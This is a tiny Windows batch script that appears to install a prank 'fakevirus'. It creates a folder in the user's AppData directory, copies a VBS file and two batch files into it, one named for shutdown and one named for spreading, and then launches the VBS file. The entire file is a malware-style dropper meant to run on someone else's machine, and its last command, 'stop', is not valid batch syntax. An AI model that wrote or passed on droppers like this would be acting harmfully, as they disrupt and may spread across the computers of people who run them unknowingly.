@echo off
mkdir %AppData%\fakevirus
copy fakevirus.vbs %AppData%\fakevirus
copy shutdown.bat %AppData%\fakevirus
copy spreadstart.bat %AppData%\fakevirus
start %AppData%\fakevirus\fakevirus.vbs
stop